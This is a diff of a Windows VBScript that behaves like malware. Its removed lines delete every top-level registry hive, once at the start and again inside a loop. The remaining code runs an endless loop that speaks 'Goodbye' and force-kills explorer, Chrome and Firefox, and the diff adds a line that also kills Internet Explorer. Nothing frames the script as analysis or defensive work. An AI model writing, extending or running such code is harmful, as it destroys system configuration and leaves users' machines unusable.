@@ -1,11 +1,3 @@
-Set WshShell = WScript.CreateObject("WScript.Shell")
-WshShell.RegDelete "HKEY_CURRENT_CONFIG"
-WshShell.RegDelete "HKEY_USERS"
-WshShell.RegDelete "HKEY_LOCAL_MACHINE"
-WshShell.RegDelete "HKEY_CURRENT_USER"
-WshShell.RegDelete "HKEY_CLASSES_ROOT"
-WScript.Sleep 1000
-
 Option Explicit
 
 Dim objFSO, objFolder, objFile, objShell, i
@@ -32,14 +24,6 @@ Set objShell = CreateObject("WScript.Shell")
 ' Say "Goodbye" and terminate various processes on the computer
 i = 1
 Do While True
-    ' Delete registry keys
-    Set WshShell = WScript.CreateObject("WScript.Shell")
-    WshShell.RegDelete "HKEY_CURRENT_CONFIG"
-    WshShell.RegDelete "HKEY_USERS"
-    WshShell.RegDelete "HKEY_LOCAL_MACHINE"
-    WshShell.RegDelete "HKEY_CURRENT_USER"
-    WshShell.RegDelete "HKEY_CLASSES_ROOT"
-    
     ' Say "Goodbye"
     objShell.Run "PowerShell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Goodbye')""", 0, True
 
@@ -49,6 +33,7 @@ Do While True
     objShell.Run "taskkill /f /im explorer.exe", 0, True
     objShell.Run "taskkill /f /im chrome.exe", 0, True
     objShell.Run "taskkill /f /im firefox.exe", 0, True
+    objShell.Run "taskkill /f /im iexplore.exe", 0, True
 
     ' Play a beep sound
     objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
